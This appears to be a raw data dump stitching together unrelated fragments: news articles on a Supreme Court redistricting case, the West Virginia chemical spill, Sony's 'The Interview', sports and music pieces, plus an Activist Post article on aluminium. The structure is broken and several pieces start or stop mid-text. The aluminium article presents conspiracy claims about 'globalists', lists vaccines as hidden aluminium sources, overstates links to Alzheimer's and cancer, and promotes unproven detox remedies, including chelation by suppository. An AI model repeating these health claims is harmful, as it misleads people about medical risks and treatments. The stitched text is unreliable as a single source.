ten of their best:\n\n10. The Tim Heidecker Masterpiece, “Bottle of Wine”\n\nLike a Huey Lewis wet dream, Masterpiece’s debut album is titled Working Vacation—because rock n’ roll’s their business, baby! While on this vacation, Heidecker and his mates were sipping on a sweet, sweet “Bottle Of Wine,” the album’s centerpiece. In the music video, Heidecker caresses his girlfriend by the piers and in the garden, between shots of the guys rocking out a basement show, where they don headbands and have the stage decorated with American flags everywhere. This band—unabashedly patriotic and manly—inspired future Tim & Eric permutations, namely Pusswhip Banggang and Dekkar.\n\n9. Wizzard, “Totally Wizzed Out!”\n\nIn one episode from the duo’s first Adult Swim show Tom Goes To The Mayor, the fictional town of Jefferton is set to host the annual, much-coveted Bass Fest. There’s going to be a bass circle, tons of techs and pros, and an appearance from popular rock artist Wizzard (played by Bob Odenkirk), who’s attempting to hit a low G note. “Three octaves lower than any man has ever played,” he claims. Earlier on in the episode, before all the low-end from the festival destroys a dam and causes the whole town to flood, Wizzard performs his track “Totally Wizzed Out!” It’s a Chili Peppers pastiche: Odenkirk mocks Anthony Kiedis’ hubba-dubba-bubba rap style and Flea’s bombastic slap-bass.\n\n8. Tim & Eric, “Sports!”\n\nThe opening track on Awesome Record, Great Songs! is a synthpop onslaught, in which the two, looking like A Flock of Seagulls rejects, duel each other on blazing keytars, followed by an ostentatious drum solo that plays for way longer than needed (the excessivity of it is hilarious). In the video they have a montage that shows some of everyone’s favorite sports, like Flight Wheel and Sand Sphere. Who doesn’t love to play Flight Wheel in the park with a friend or Sand Sphere on a nice day at the beach?\n\n7. Tim & Eric’s Casey Tatum & His Brother, “Hamburgers and Hotdogs”\n\nAll Casey wants to have is a barbecue! Played by Heidecker, he’s got snot and saliva all around his mouth, cascading in globs onto the hotdog he’s trying to shove down his throat. Throughout the song, as a bubbly keyboard and stale drum-loop go on in the background, Casey scrunches his face, moaning and yelping; his brother, Wareheim, dances around in a hamburger suit going, “I like parties, I like fun, I want to live in a hamburger bun.”\n\n6. Tim & Eric’s Zwei Dunkel Jungen, Live Performance\n\nWhile their sole song plays for only a few seconds and is without a title, Zwei Dunkel Jungen (German for “Two Dark Boys”) is one of Tim & Eric’s most obscure satires. Instead of mainstream rock bygones, here they’re making fun of pretentious experimental/industrial in the vein of Throbbing Gristle. The two are garbed in face-paint and tight leather; the song is the culmination of them just testing out their synthesizers onstage.\n\n5. Tim & Eric’s Kid Break, “Wipe My Butt”\n\nOn Tim & Eric’s fictitious Channel 5 News, they have a series of PSA’s called Kid Break; with the two dressed in denim and leather jackets, loitering outside a mini-mart, it’s meant to appeal to the “cool teen” demographic. During this track, Heidecker raps about the resourcefulness of not taking care of his skid marks. “I don’t wipe my butt ‘cause it’s a waste of toilet tissue,” he goes. “My brown, crusty stains are an environmental issue.” Revelatory and delicious. (Also, The Shins happen to have a sweet, folksy cover of “Wipe My Butt.”)\n\n4. Tim & Eric’s Pipple Brothers, “Goatee”\n\nFor the JASH Network, Tim & Eric came up with a power ballad about the insurmountable beauty of goatees. Heidecker is on grand piano and main vocals, while Wareheim does percussion, randomly interjecting a messy drum-fill or cowbell hit over Heidecker’s lyrics. There’s synthetic trumpet and saxophone tones aplenty, reinforcing the 80’s schlock that the two succeed in encapsulating.\n\n3. Tim & Eric’s Pusswhip Banggang, “Jambalaya”\n\nPusswhip first appeared on Awesome Show during a faux-advertisement for the band’s greatest hits cassette, and in 2009 they managed to get a slot at the popular Los Angeles happening FYF Fest. But in 2014, four years after Awesome Show’s final episode, Tim & Eric revived the band to formally release one of their staple tracks—“Jambalaya,” which just sounds like Foghat if they were doing an homage to New Orleans cuisine. In the AOR spirit of “Jambalaya,” they even have a special nine-minute version as part of Drag City Records’ release of the track.\n\n2. Tim Heidecker, “Work From Home”\n\nIt has been argued that Heidecker’s In Glendale is his most serious musical work. What that really means, though, is his humor isn’t as glaring as usual. The gist of “Work From Home” is worth chuckling over for a second: Heidecker’s hungover, so he plans to take the day off and stay in bed—but upon listening further, you can’t ignore that the song is surprisingly quaint and heartfelt. Heidecker’s croon is sleek, as are the guitars, and the choruses are splendid. But his humor starts to become apparent again whenever he drops a cliché worth rolling your eyes at, like the opening line, “I’m low—low to the ground.”\n\n1. Dekkar, “Trigger Everything”\n\nIn his latest Adult Swim series Decker, Heidecker plays the eponymous special agent, who’s seemingly in a constant state of inebriation while going about his missions. Simultaneously, he’s pondering the most vicious ways to castigate his boss—the fictitious President Jason Davidson (Joe Estevez)—for, in his opinion, not acting like a “true American.” Jack Decker loves Trump and hates immigrants, but he especially loathes PC culture. It’s why. in his spinoff band Dekkar, who appear on the episode “Band Together,” he’s got a song called “Trigger Everything.”\n\n“You trigger my anger, you trigger my pain / you trigger my loss and you trigger my brain,” Decker belts during the chorus. By dumbing down PC-ness with a much too stereotypical “ignant” conservative attitude, alongside such trite lyrics, Heidecker renders both the song and his character as ingeniously funny.",
  "latent_30674": "Former Eagles offensive lineman Evan Mathis complained his way out of Philadelphia. He wanted more money (despite being set to make $5.5 million this season) and didn't get it from the fighting Chip Kellys.\n\nYou know what that means. Mathis wasn't long for Philadelphia. He was eventually jettisoned.\n\nSeen this before? Wide receiver DeSean Jackson, running back LeSean McCoy, defensive end Trent Cole, quarterback Nick Foles and offensive linemen Todd Herremans have. If you're not a Chip Kelly guy, you're destined for a new team.\n\nThe question for Mathis will be: Was it worth it? Will he get that additional money he was fighting for so diligently behind the scenes over the past few years?\n\nSo I asked for some opinions and had three sources guestimate what Mathis would land on the open market. The three-man anonymous panel consisted of a front-office executive, a salary cap expert and an agent.\n\nHere were the results:\n\nExecutive: 1 year, $3-3.5 million with incentives to reach $5 million\n\nSalary Cap Expert: 3 years, $14-17 million with $6-8 million guaranteed\n\nAgent: 1 year, $3-4 million with incentives to reach $5.5 million\n\nIf the executive and agent are in the right range, this was a mistake by Mathis and agent Drew Rosenhaus. They miscalculated his market. The 33-year-old would have to reach certain attainable incentives to even recoup what he was supposed to pocket this season if he was on the Eagles roster.\n\nMathis may have made multiple Pro Bowls, but he's over-30 and only played nine games last season because of injury. He was a career journeyman before landing in Philadelphia in his seventh professional season and isn't a great fit schematically for most teams. He's a smallish guard (6-5, 298) made for a zone-blocking scheme. The executive and agent think these factors will work against Mathis.\n\nIf the salary cap expert is close, this gamble will probably be worth it. Mathis lands in a spot where he feels wanted and is guaranteed more money (granted over multiple years) than he was with the Eagles, who likely would have dumped him after this season at 34 years old unless he had a Pro Bowl year. Mathis was set to make $6 million in 2016.\n\nIf any of the three surveyed sources are correct, Mathis will get nowhere near the payday his team and the public seem to think he'll land on the open market. The $6.5-7 million per season that is being bandied about is a pipe-dream, even if it's only for a season or two.\n\nOr maybe there is that one team desperate enough to blow away the field and meet Mathis' demands. If that's the case, it will seemingly shock those around the league.\n\nOne thing is certain ‐ that big money won't come from any of the three local teams. The Eagles ... that ship has sailed. The Giants and Jets ... they're not paying that hefty price and don't have the salary cap space to do it even if they wanted.\n\nJordan Raanan may be reached at jraanan@njadvancemedia.com.

  "latent_30847": "The operational life of one of Scotland’s two remaining nuclear power stations is to be extended by seven years.\n\nFrench energy giant EDF has unveiled plans to extend the lifespan of four nuclear power stations across the UK, including Torness in East Lothian.\n\n“Their excellent output shows that reliability is improving whilst their safety and environmental performance is higher than ever,” said EDF chief executive officer Vincent de Rivaz.\n\nThe Scottish facility began generating electricity in 1988 with an original expected lifespan of 30 years.\n\nThe firm said the plant, which was due for decommissioning in 2023, will stay open until at least 2030. It employs more than 700 people and produces enough power for two million homes.\n\nPaul Winkle, station director at Torness, added: “Extending the life of this low-carbon generation up to 2030 is good for the Scottish economy.”\n\nBut environmentalists hit out at the move, branding it “bad news” for the country’s emissions goals and for democracy.\n\nSarah Beattie-Smith, infrastructure and investment spokeswoman for the Scottish Greens, said: “The fact that a private company can dictate energy policy for another seven years undermines democracy, both in the local community in East Lothian and nationally at a time when the Scottish Government ought to be focused on our ambitious climate targets.\n\n“Torness is almost 30 years old and we should be planning for its decommissioning.\n\n“With Scotland’s abundant renewable energy resources and the need to focus on energy-efficiency, we have no need for nuclear and we should be investing in jobs and infrastructure that do not store up exorbitant costs for future generations.”\n\nThe Scottish Government is against new nuclear power plants being built north of the Border, but a spokesman said it backs extending the lifespan of existing facilities if “environmental and safety requirements continue to be met”.\n\nThe announcement came as EDF, which also owns Hunterston B nuclear power station in North Ayrshire, announced a 68 per cent fall in profits.\n\nDr Richard Dixon, director of Friends of the Earth Scotland, said the move was disappointing but “hardly a surprise”. He called for the UK to “refocus” on renewables and stop chasing “the nuclear dream”.\n\nHe added: “Nuclear power is the ultimate unsustainable form of energy, creating waste which needs to be looked after for 25,000 years.”\n\nScottish heritage: for stories on Scotland’s people, places and history >>",

  "latent_30996": "Alabama lawmakers study a map of the proposed redistricting plan crafted by the Republican state Legislature in 2012. (Photo11: File photo by Dave Martin, AP)\n\nWASHINGTON — A deeply divided Supreme Court dealt a blow Wednesday to a Republican redistricting plan in Alabama that packed black voters into urban districts to dilute their impact elsewhere.\n\nBy a 5-4 vote and over the vigorous objection of its lone black member, the justices upheld the objections raised by Democratic and black lawmakers and sent the case back for further review by a lower court.\n\nThe decision represented a legal reversal of sorts from earlier decades, when the federal government forced mostly Southern states to create what are considered \"majority-minority\" districts more likely to elect black lawmakers. Now, the justices are saying it may be illegal to have too many blacks clustered in one district, at the expense of others.\n\n\"Given that it is 2015, this decision may not have much impact on post-Census 2010 redistrictings, but it will be an important precedent for the next wave of redistrictings,\" said Jon Greenbaum, chief counsel at the Lawyers' Committee for Civil Rights Under Law.\n\nA federal district court had upheld maps drawn by Alabama's Republican state Legislature in 2012 that maintained or increased the percentages of black voters in black lawmakers' districts — even though, as the challengers claimed, such high percentages were not needed.\n\nBut Justice Stephen Breyer, explaining his opinion from the bench, said \"simply maintaining percentages in an effort to prevent retrogression ... is too mechanical an approach.\" He was joined by Justices Anthony Kennedy, Ruth Bader Ginsburg, Sonia Sotomayor and Elena Kagan.\n\nA provision of the Voting Rights Act that, ironically, has since been rendered obsolete by the Supreme Court \"does not require maintaining the same population percentages in majority-minority districts as in the prior plan,\" Breyer wrote. \"Rather, (the law) is satisfied if minority voters retain the ability to elect their preferred candidates.\"\n\nThe majority opinion drew angry, 13-page dissents from Justices Antonin Scalia and Clarence Thomas, the court's only black justice. Scalia, joined by Thomas, Chief Justice John Roberts and Justice Samuel Alito, called it \"a sweeping holding that will have profound implications for the constitutional ideal of one person, one vote.\"\n\nThomas' separate dissent disparagingly said the case represents \"nothing more than a fight over the 'best' racial quota.\"\n\n\"Long ago, the Department of Justice and special-interest groups like the American Civil Liberties Union hijacked the (Voting Rights Act), and they have been using it ever since to achieve their vision of maximized black electoral strength, often at the expense of the voters they purport to help,\" Thomas said.\n\nAlabama's black and Democratic legislators had challenged the maps as going far beyond what was necessary to help blacks get elected or stay in office. They said the plan was intended to weaken blacks' influence in other parts of the state represented mostly by white Republicans.\n\nThat same strategy has been employed by newly minted GOP majorities in other Southern states, from Virginia to Texas. For that reason, the Alabama case was being closely watched elsewhere.\n\nThe use of race by Republicans is ironic, because it was Democrats in Alabama and throughout the South who originally used race to draw election districts where black voters could wield more clout. For decades, the Justice Department and federal courts sanctioned those actions to remedy historical racial discrimination.\n\nRedistricting is among the spoils awarded to the political party in power in a given state. The Supreme Court has long allowed party affiliation to influence the drawing of political boundaries.\n\nIn Alabama, however, race and political affiliation are intertwined, and the court has limited how strongly lawmakers can consider race when drawing maps.\n\nAlabama Solicitor General Andrew Brasher told the court during oral arguments in November that the maps were drawn to even out districts' populations and keep counties from being split between districts, as well as to protect incumbents. Republicans had won control of the Legislature in 2010.\n\nOn Wednesday, state Attorney General Luther Strange noted that state House and Senate districts will not change while the case is reconsidered by the district court.\n\n\"While I am disappointed that the Supreme Court vacated the district court's decision, the court did not invalidate the redistricting plan as a whole or any specific district,\" he said. \"My office will continue defending the State's legislative districts.\"\n\nOne question related to the debate is how states with a history of racial discrimination, mostly in the South, will navigate issues such as redistricting now that the Supreme Court has declared a key part of the Voting Rights Act unconstitutional. That 2013 decision, written by Roberts in a case from Alabama's Shelby County, freed states from needing federal approval before changing their voting procedures.\n\nFollow @richardjwolf on Twitter\n\nRead or Share this story: http://usat.ly/1CavCpg",

  "latent_31812": "Freedom Industries, Inc.\n\nSchool ended early last Monday for students at three elementary schools and one middle school in Kanawha County, West Virginia. Members of the National Guard and the state departments of environmental protection and health were called in. It was the rapid-response team's third deployment to schools in the county this month.\n\nThe teachers said the tap water smelled like licorice candy—a fragrance associated with MCHM (4-Methylcyclohexanemethanol), a coal-extraction chemical that had flooded the water supply for 300,000 people in nine West Virginia counties on January 9. Residents of Charleston and the surrounding area live in fear of the sweet scent, and they have grown increasingly bitter.\n\nWest Virginia is coal country. More than a million acres of mountain have been blown apart in Appalachia, where the state is situated, in order to retrieve it. Not to mention, West Virginia is plastered with signs extolling the patriotic virtues of the black geological discharge. The signs tout coal as a source of energy independence for the Red, White, and Blue and implore residents to be proud of their natural resources. They frame regulation as an impingement on freedom and a threat not only to the livelihoods of West Virginians but to the country as a whole. Environmentalists have been harassed, beaten, and threatened with their lives for suggesting otherwise.\n\nMeanwhile, local ambulance chasers have launched ad campaigns of their own, appealing to those diagnosed with silicosis, mesothelioma, pneumoconiosis (commonly referred to as Black Lung), and other diseases associated with coal extraction to seek their legal services. It's a sign of the imprint the industry has had on the state's rural communities over the decades. Now, the 10,000-gallon MCHM spill from a chemical storage facility run by Freedom Industries—just a mile upstream from a water treatment plant on the Elk River—has raised questions over how much environmental degradation West Virginians are willing to tolerate in the name of patriotism.\n\nIn the immediate aftermath of the contamination, 671 people called poison control, complaining of severe vomiting and diarrhea, rashes and dizziness. The White House declared much of the state a federal disaster area and state troopers were deployed to deliver water.\n\nFive days later, the local water utility declared their product safe to drink. “We are in compliance with all the standards set by the health-based agencies, like the CDC [Center for Disease Control], the West Virginia Bureau of Public Health, and we have been since the 13th of January,” Jeff McIntyre, oresident of West Virginia American Water, later testified at a congressional hearing in Washington on February 2.\n\nBut the safety claims have come with a caveat, as illustrated by a note still taped to water coolers at the Charleston airport more than a month after the spill. “West Virginia American Water has announced that our water meets all regulatory standards,” it read, explaining to visitors that the cooler was placed there simply for the sake of their “convenience.”\n\nBut there was an asterisk: “Pregnant women and children under the age of three are advised not to drink our local water.”\n\nThe trouble is, MCHM is an unregulated chemical, meaning there are no federal or state guidelines demarcating what levels are toxic and what levels are not. To quote the CDC's website, “There should be no MCHM in drinking water.”\n\nTo determine a safe does, the CDC relied on independent studies conducted by Eastman Chemical Company, which had manufactured the MCHM in question, but it said that more research is needed.\n\nA second toxic chemical—a compound of propylene glycol phenyl and dipropylene glycol—was also released in lesser amounts in the spill, but not disclosed by Freedom Industries until January 21. Just like MCHM, little is known about this toxin.\n\nAt the same congressional hearing at which McIntyre testified, the head of West Virginia's Bureau of Public Health, Letitia Tierney, described the water as \"usable,\" though she admitted that \"everybody has a different definition of safe.\"\n\nScrambling for some marker of quality control, officials have set limits of one part per million of MCHM for children three years or younger and for pregnant women; they claim that 1.2 ppm is safe for everyone else.\n\nRobert Goodwin, project manager at Coal River Mountain Watch, an environmental group that has been conducting field testing of water in the Charleston area, said samples taken in homes on the January 13 contained one tenth of the official MCHM safety threshold, but it remains uncertain what the long-term effects of ingesting the chemical will be on residents of the poisoned counties.\n\n“It's a scientific experiment to have people drinking this water,” said Goodwin.\n\nWest Virginians don't want to be used as lab rats. On January 30 about 60 people protested in front of the statehouse, calling for stricter safety standards. One man, who had traveled to Charleston from nearby Boone County for the rally, attempted to enter the capitol building to show legislators water from his poisoned well. He was denied access by security, who considered the jug of orange liquid he carried a threat.\n\nA fear of the tap has made bottled water a highly sought-after commodity. Locals don't trust their water. They won't drink it, won't wash with it, and won't let their pets or livestock near it, either. On Valentine's Day, supermarket marquees in Charleston advertised bottled water and roses. Local environmental groups are considering conducting epidemiological studies among residents in the affected counties. Everyone has a story.\n\n“My fiancée has several allergies and sensitive skin,” said Michael Withrow, explaining what happened when the couple showered after getting the go-ahead from American Water. “Almost immediately she broke out into a rash and complained of pain in her hands. They were swollen and flush. She spent six hours in the ER. Since then, the licorice odor has decreased, and we are back to taking showers, but we are only taking them every few days. Occasionally, she still has mild reactions.”\n\nTwylla Bays has a 28-year-old daughter with muscular dystrophy who experienced severe bouts of diarrhea in the initial contamination. Now, Twlla said, “I can't bath her at all.”\n\nAmerican Water has continued to bill customers at regular rates since the spill—even for pregnant households and those with small children—though a deduction of $10.25 was made for those who were advised to flush their pipes in January.\n\nInexplicably, local residents have also said they felt the symptoms of MCHM—rashes, headaches, nausea, diarrhea, and retching, along with burning, itchy eyes, and inflamed sinuses (signs of airborne exposure)—days, weeks, even years before the spill was announced. These claims could be based on hypochondria or be unrelated to the contamination. But Freedom Industries has been operating its chemical storage facility since 1986, and the last time federal regulators visited prior to the spill was in 1991. Chemical storage facilities are not regulated by the state of West Virginia at all.\n\n“There could have been many more, smaller leaks before this one that we never learned about,” said Robert Goodwin, of Coal River Mountain Watch. He noted that local politicians have recently “toned down their anti-regulatory rhetoric” and expressed hope that the spill would lead to greater protections for West Virginia's water and air.\n\nEven as damage control continued in the aftermath of the Freedom Industries spill, new catastrophes have begged attention. One hundred thousand gallons of coal slurry spewed from a ruptured pipe into a creek that feeds into the Kanawha River on February 11. Then, last Wednesday, melting snow caused a pond containing coal-mining refuse known as “blackwater” to spill over into a stream in the town of Gary.\n\n“You don't protect the environment after the fact,” Randy Hoffman, with the state's Department of Environmental Protection, told reporters last week, though his office has so far rejected pleas from the federal Office of Surface Mining Reclamation and Enforcement that it apply stricter regulatory safeguards to the coal industry.\n\nUntil regulators step up, disasters will keep coming as certain as the sun will rise.\n\nAll photos via Facebook\n\n@JohnReedsTomb",
  "latent_31826": "Andrew Puhanic, Contributing Writer\n\nActivist Post\n\nWe are all unwillingly exposed to a range of cancer-causing chemicals and substances every day. One substance that the globalists and government don’t want you know about that could be causing you considerable harm and health problems is aluminium.\n\nThe fact is most people are exposed to aluminium on a daily basis. Very little is publicized about the risks and dangers of being exposed to aluminium, and most of us are unaware of how many common products use aluminium as a medium of storage or control.\n\nNew research published in the Journal of Applied Toxicology has revealed that long-term exposure of MCF-10A human mammary epithelial cells to aluminium results in anchorage-independent growth, a key hallmark of cultured tumour cells and of cells on the way to malignant transformation. This study also found that shorter (7 days) exposure to aluminium results in diminished cell numbers owing to cellular senescence.\n\nA commonly used household product that contains aluminium is deodorant (antiperspirants). The aluminium contaminant found in most antiperspirants is Aluminium Chlorohydrate. A 1990 study discovered an association between exposure to aluminium and long-term use of antiperspirants and Alzheimer’s disease. Observations made indicated a trend toward a higher risk with increasing frequency of use. [1]\n\nDue to the ease of Aluminium being absorbed through the skin in the daily application of antiperspirants containing high concentrations of aluminium, this type of exposure can increase the risks of being exposed to Aluminium Chlorohydrate well above what would be considered normal.\n\nThe effect of aluminium on cellular proliferation and cellular senescence is strikingly similar to that of activated oncogenes, which increases DSBs and cellular senescence by inducing proliferation stress when transfected into normal cells. The study found this effect surprising for aluminium, present in antiperspirants at high concentrations because, presumably, it is considered harmless for the breast area. In contrast to gallium and indium which belong to the same group as aluminium in the Mendeleev Table, they did not induce anchorage-independent growth in MCF-10A cells, showing that the effects reported in this study are specific for aluminium. [2]\n\nAlthough most of us are exposed to aluminium at home, many are exposed to aluminium during the production of aluminium products. Aluminium production and metalworking industries have shown consistent elevated risks for pancreatic cancer [3]. In Canada, the mortality of a large group of men employed in aluminium production using the Söderberg process was examined between 1950 and 1977, and compared with the pertinent rates for the Province of Quebec. Workers exposed to condensed pitch volatiles exhibited significantly increased mortality from all cancers (304 observed, 246.6 expected), and from esophageal and stomach cancer (50 observed, 32.8 expected), lung cancer (101 observed, 70.7 expected) and other malignancies (60 observed, 45.3 expected) [4].\n\nOther Products That Contain Aluminium\n\nThe number of products that contain aluminium is unbelievable. The globalists and the government don’t want you to know what products contain aluminium. So why are the government and the globalists not advising you, the consumer, of the risks of using products that contain aluminium? The only logical reasons I can think of would be because many of the globalists have vested interests in organisations that produce profitable products that contain aluminium, and the government is reaping millions of dollars in tax from the purchase of products that contain aluminium. The following is a list of household products that the globalists and the government don’t want you to know that contain aluminium.\n\nAntiperspirants\n\nAntacids\n\nMany body lotions and creams\n\nMost cosmetics\n\nShampoos and conditioners\n\nSoaps\n\nSuntan lotions\n\nLip Balm\n\nProcessed cheese\n\nBaking powder\n\nCake mix\n\nFrozen dough\n\nPancake mix\n\nSelf-raising flour\n\nPickled vegetables.\n\nAlso, the following food additives contain aluminium compounds. They are E173, E520, E521, E523 E541, E545, E554, E555 E556 and E559.\n\nAluminium salts are also found in many common medicines.\n\nAntacids\n\nAnti-diarrhea products\n\nAnti-hemorrhoid preparations.\n\nVaccines\n\nPlease note, if your doctor has prescribed the above three medicines, please do not discontinue using them. Speak to your doctor at your next appointment and ask if there are any suitable alternatives.\n\nDownload Your First Issue Free!

A study published in 2003 by the European Journal of Cancer Prevention found a correlation between earlier diagnosis of breast cancer and antiperspirant deodorant use (5). A 2003 study also indicated “underarm shaving with antiperspirant deodorant use may play a role in breast cancer [5].\n\nThankfully, the link between breast cancer and aluminium is not conclusive and still needs considerable research to be conducted. A 2004 study reviewing the evidence for and against the possible link between breast cancer and underarm cosmetics wrote “Although animal and laboratory studies suggest a possible link between certain chemicals used in underarm cosmetics and breast cancer development, there is no reliable evidence that underarm cosmetics use increases breast cancer risk in humans [6].\n\nSymptoms of Overexposure to Aluminium\n\nThe fundamental problem we all face is that the many symptoms of aluminium poisoning are usually associated with other illnesses. This therefore poses a risk to the identification and causes of many illnesses. Symptoms of over exposure to aluminium can be:\n\nColic\n\nRickets\n\nGastrointestinal problems\n\nInterference with the metabolism of calcium\n\nExtreme nervousness\n\nAnemia\n\nHeadaches\n\nDecreased liver and kidney function\n\nMemory loss\n\nSpeech problems\n\nSoftening of the bones\n\nAching muscles\n\nHow to Remove Aluminium from your Body\n\nThere are many options available if you would like to remove heavy metals such as aluminium from your body. One recommendation I would first suggest would be to visit your local Naturopath. Your local Naturopath would have a good understanding of what foods are ordinarily consumed were you live and the local remedies that are available. Common foods that can be used to detox heavy metals are as follows:\n\nChlorella\n\nLemon Juice\n\nApples\n\nSoaking your feet with Epsom salts and sea salt (1/2 cup each).\n\nTurmeric\n\nGarlic\n\nFish Oil\n\nVitamin C\n\nKelp\n\nIonic Foot Bath\n\nModifilan\n\nChelation Therapy – EDTA, DMSO, etc. Chelation can be done by IV, orally or by suppository.\n\nDetox clay bath\n\nMalic acid – in supplement form or just eat apples.\n\nMagnesium – helps shut out aluminium from cells. Works hand in hand with malic acid.\n\nEat sulfur-rich foods such as eggs, cabbage, beans and onions. [7]\n\nAmerican Natural Superfood - Free Sample Conclusion The risks associated with being exposed to aluminium regularly outweigh the cost of avoidance. This harmful product is found in our food, medications and cosmetics. Overexposure can increase the risk of developing Alzheimer’s disease and various other illnesses. The best way to reduce the risk of being overexposed to aluminium is to avoid it all together. What the globalists and our government are doing here is exactly the same as what they did with the use of BPA in children’s products. I encourage you to begin making the necessary changes to your daily routine to eliminate this heavy metal from your body. We are already overexposed to many heavy metals and poisons, and this is one that can be easily eliminated.

  "latent_31849": "Sony Pictures will not release \"The Interview\" on Christmas Day, and the studio has \"no further release plans\" for the film, this according to a studio spokesperson. It had been speculated that Sony would consider releasing the film either via on-demand services or in theaters at a later date. The studio also announced that it would not release \"The Interview\" worldwide.\n\nSony announced it had pulled \"The Interview\" in a statement released on Wednesday:\n\nIn light of the decision by the majority of our exhibitors not to show the film The Interview, we have decided not to move forward with the planned December 25 theatrical release. We respect and understand our partners’ decision and, of course, completely share their paramount interest in the safety of employees and theater-goers. Sony Pictures has been the victim of an unprecedented criminal assault against our employees, our customers, and our business. Those who attacked us stole our intellectual property, private emails, and sensitive and proprietary material, and sought to destroy our spirit and our morale – all apparently to thwart the release of a movie they did not like. We are deeply saddened at this brazen effort to suppress the distribution of a movie, and in the process do damage to our company, our employees, and the American public. We stand by our filmmakers and their right to free expression and are extremely disappointed by this outcome.\n\nSony's decision capped a whirlwind day, which saw the nation's five biggest theater chains cancel plans to screen \"The Interview.\" Regal Entertainment, AMC Entertainment, Cinemark, Cineplex Entertainment and Carmike Cinemas pulled the comedy following a terror threat made Tuesday by hackers who had attacked Sony Pictures.\n\n\"Due to wavering support of the film 'The Interview' by Sony Pictures, as well as the ambiguous nature of any real or perceived security threats, Regal Entertainment Group has decided to delay the opening of the film in our theaters,\" a representative for Regal said in a statement to The Huffington Post. Sony had previously placed the decision to cancel showings of \"The Interview\" at the feet of theaters owners.\n\nOn Tuesday, the hackers referenced the Sept. 11 terrorist attacks in a statement that threatened \"the very time and places 'The Interview' be shown.\" Officials for the Federal Bureau of Investigation and the Department of Homeland Security acknowledged they were aware of the threat, but downplayed the likelihood of an incident. Speaking to ABC News on Wednesday, President Barack Obama said people should feel safe about visiting their local theaters.\n\n\"Well, the cyberattack is very serious,” Obama said. “We're investigating it. We're taking it seriously. You know, we'll be vigilant. If we see something that we think is serious and credible, then we'll alert the public. But for now, my recommendation would be that people go to the movies.\"\n\nCo-directed by Seth Rogen and Evan Goldberg, \"The Interview\" focuses on an entertainment journalist (James Franco) and his producer (Rogen) and their eventually successful attempts to assassinate Kim Jong Un (Randall Park). In June, Kim Myong-choi, an unofficial spokesperson for Kim, slammed \"The Interview\" in a statement to The Telegraph.\n\n\"There is a special irony in this storyline as it shows the desperation of the U.S. government and American society,\" he said. \"A film about the assassination of a foreign leader mirrors what the U.S. has done in Afghanistan, Iraq, Syria and Ukraine. And let us not forget who killed [President John F.] Kennedy -- Americans.\"\n\nThe film's ending, which features Kim Jong Un dying in a helicopter explosion while Katy Perry's \"Firework\" plays on the soundtrack, was the source of much debate within Sony Pictures. As far back as August, The Hollywood Reporter noted that Sony executives had discussed altering the scene. Emails leaked online as part of the massive cyber attack on the studio revealed those conversations did take place and some concessions were made with how Kim's death was portrayed. According to Rogen, Sony reportedly tweaked little else before the film was finished.\n\n\"They made us digitally change some photos and images, because it was decided they weren't [legally] cleared,\" Rogen told The New York Times in an interview published Tuesday. \"We couldn't source the photographer in North Korea who took the photograph of Kim Il Sung [Kim Jong Un's grandfather] 65 years ago. He could sue us. There was a moment where they were like: 'They've threatened war over the movie. You kill him [Kim Jong Un]. Would you consider not killing him?' And we were like, 'Nope.'\"\n\nAccording to reports from CNN and NBC, the United States government has determined North Korea to be behind the cyber attack on Sony.\n\nThis post has been updated to include a statement from President Barack Obama and further information about Sony's release plans.",

I grew up with him teaching me how to play soccer, but you could tell that he didn’t have much energy or strength anymore,\" she said.\n\nSo she and her sisters quietly hatched a plan to be tested to see if one of them could be a suitable donor.\n\nThe oldest daughter was immediately ruled out due to her blood type, but Erin and her twin sister found out they were both a match.\n\nThey had additional testing to see if they were identical twins as they had always suspected. If so, that would give them a backup plan if the sister who donated a kidney ever needed one herself. Erin knew this would calm her dad’s fears and make it easier for him to accept the gift.\n\nWhen the results showed that the sisters are identical and that Erin would be the best donor, it was settled.\n\n“I had no idea they were planning this,” John said. “All of them wanted to be able to donate. It really is truly a touching thing.”\n\nFor Erin, the decision was simple.\n\n“I was ready to do it,” she said with her dad’s hand clasped in hers. “He means the world to me. He’s done more than I could ever ask for for a dad. This was just kind of scratching the surface on paying him back.”\n\nJust three days after Erin got engaged, the father and daughter went into surgery May 16 at Baylor.\n\nThe transplant went smoothly and the two were transferred to Erin’s unit at the hospital where they were under her colleagues' care.\n\nErin was up and walking hours after surgery. John’s recovery process was a bit slower, but he noticed immediate improvements. Erin’s kidney worked well, almost too well.\n\n“I’ve lost a lot of fluid weight because the kidney is working so good, so I have to drink a lot of water,” he said. But he welcomes the change.\n\nWhile the father and daughter continue to recover at home, John works patiently on building his strength. Erin spends her days making sure he eats enough and planning her Dallas wedding with the comfort that her dad will be there to walk her down the aisle.\n\n“I wouldn’t miss it for the world,” said John, holding back tears. “It never crossed my mind that I wouldn’t be there.”\n\nAs he sits in his leather living room chair lifting his arm weights, drinking 3 liters of water and washing down 26 different medications every day, John thinks about the hopes he has for his life after recovery.\n\nHe thinks about working out again, going hunting with his friends, getting back to his patients at the hospital and dancing with his daughter on her wedding day. He thinks about getting strength back to his weakened body. And he thinks about Erin, his little girl whose selfless gift will make it all possible.\n\n“How can you not sit here and think this is the best Father’s Day gift you’ll ever have in your life?”",

I used Chrome's about:memory page to see memory usage.\n\nIn the interest of not wanting to taint the results with freedom and open source, I conducted a similar test on Windows 8 because, sadly, browser vendors optimise their browsers much better for Windows than other platforms.\n\nThe set of tabs I loaded into each browser was Google+, Gmail, Google Drive and 5 open spreadsheets, Google Reader, and an Omniture statistics instance. There's a simple reason why I choose Google properties to test memory consumption — they like loading large amounts of JavaScript.\n\nThe three browsers tested were Chrome 24, Firefox 18, and IE 10.\n\nWhile the margins between the results is not large and the test was only on 10 tabs, it's clear which browsers are better at memory management. Over the course of an hour or so, I watched Firefox and Chrome saving memory here and there, often being neck and neck, or a slight edge to Firefox, while in IE's case, more RAM was consumed as time went on — a small leak must have been in there somewhere.\n\nI don't think the memory difference is enough for Chrome users to down tools and move over to Firefox immediately. There's still the issue of raw performance itself.

Trump is considering the former CIA director for secretary of state.\n\n“I don’t vote, so that’s an easy answer,” Petraeus told ABC’s This Week. “And I also did not support him nor did I oppose him. Nor did I support or oppose any other candidate. I’ve truly tried to be apolitical, nonpolitical,” he said Sunday.\n\nHe also said on the program that the president-elect was “quite pragmatic,” commenting on his meeting in New York City last week with Trump for a potential cabinet position.\n\nTrump is considering several other people for the State Department, including former Massachusetts Governor Mitt Romney, former New York City Mayor Rudy Giuliani, and Sen. Bob Corker (R-Tenn.).",
